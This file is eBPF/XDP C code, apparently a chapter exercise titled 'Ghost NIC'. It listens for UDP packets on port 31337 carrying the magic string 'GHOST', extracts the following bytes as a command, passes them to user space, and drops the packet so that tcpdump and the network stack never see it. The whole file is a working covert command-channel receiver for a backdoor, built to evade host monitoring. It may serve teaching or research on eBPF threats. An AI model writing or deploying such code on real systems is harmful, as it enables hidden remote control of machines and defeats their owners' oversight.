// Ch05b Ghost NIC — XDP program recognizes UDP dst port 31337 with magic
// payload "GHOST", extracts command, emits ringbuf event, XDP_DROPs so the
// packet never reaches the stack/tcpdump.
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

char LICENSE[] SEC("license") = "GPL";

#define GHOST_PORT 31337

struct evt {
    unsigned int saddr;
    unsigned int daddr;
    unsigned short sport;
    unsigned short dport;
    char cmd[48];
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");

SEC("xdp")
int xdp_ghost(struct xdp_md *ctx)
{
    void *data     = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end) return XDP_PASS;
    if (eth->h_proto != bpf_htons(0x0800)) return XDP_PASS;  // IPv4 only

    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end) return XDP_PASS;
    if (ip->protocol != 17) return XDP_PASS;  // UDP

    unsigned int ihl = ip->ihl * 4;
    if (ihl < sizeof(*ip)) return XDP_PASS;
    struct udphdr *udp = (void *)ip + ihl;
    if ((void *)(udp + 1) > data_end) return XDP_PASS;
    if (udp->dest != bpf_htons(GHOST_PORT)) return XDP_PASS;

    char *payload = (char *)(udp + 1);
    if (payload + 5 > (char *)data_end) return XDP_PASS;
    if (!(payload[0]=='G' && payload[1]=='H' && payload[2]=='O' &&
          payload[3]=='S' && payload[4]=='T')) return XDP_PASS;

    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return XDP_DROP;
    e->saddr = ip->saddr;
    e->daddr = ip->daddr;
    e->sport = bpf_ntohs(udp->source);
    e->dport = bpf_ntohs(udp->dest);
    __builtin_memset(&e->cmd, 0, sizeof(e->cmd));

    // Copy up to 47 bytes of command (payload after the 5-byte magic).
    char *cmd_src = payload + 5;
    unsigned int i = 0;
    #pragma unroll
    for (i = 0; i < sizeof(e->cmd) - 1; i++) {
        if (cmd_src + i + 1 > (char *)data_end) break;
        e->cmd[i] = cmd_src[i];
        if (cmd_src[i] == 0) break;
    }
    bpf_ringbuf_submit(e, 0);
    return XDP_DROP;
}
